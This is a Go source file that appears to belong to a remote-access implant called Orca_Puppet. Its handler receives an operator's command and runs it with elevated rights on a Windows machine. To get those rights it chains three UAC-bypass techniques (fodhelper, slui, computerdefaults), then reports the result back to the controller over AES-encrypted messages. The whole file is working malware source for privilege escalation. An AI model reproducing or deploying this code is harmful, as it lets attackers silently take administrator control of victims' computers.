package controller

import (
	"Orca_Puppet/cli/common"
	"Orca_Puppet/define/colorcode"
	"Orca_Puppet/define/config"
	"Orca_Puppet/pkg/bypassuac"
	"Orca_Puppet/tools/crypto"
	"Orca_Puppet/tools/util"
	"fmt"
	"os"
	"strings"
)

func getAdminCmd(sendUserId, decData string) {
	cmd := decData

	if len(strings.TrimSpace(cmd)) == 0 {
		path, err := util.GetExecPath()
		if err != nil {
			message := fmt.Sprintf("%v", err)
			data := colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
			outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
			common.SendFailMsg(sendUserId, common.ClientId, "getAdmin_ret", outputMsg)
			return
		}
		args := strings.Join(os.Args[1:], " ")
		cmd = fmt.Sprintf("%s %s", path, args)
	}

	err := bypassuac.ExecFodhelper(cmd)
	if err != nil {
		err = bypassuac.ExecSlui(cmd)
		if err != nil {
			err = bypassuac.ExecComputerdefaults(cmd)
			if err != nil {
				message := fmt.Sprintf("failed to obtain administrator privileges: %v", err)
				data := colorcode.OutputMessage(colorcode.SIGN_FAIL, message)
				outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
				common.SendFailMsg(sendUserId, common.ClientId, "getAdmin_ret", outputMsg)
				return
			}
		}
	}
	data := colorcode.OutputMessage(colorcode.SIGN_SUCCESS, "successfully obtained administrator privileges, please check whether a new host is online")
	outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
	common.SendSuccessMsg(sendUserId, common.ClientId, "getAdmin_ret", outputMsg)
}
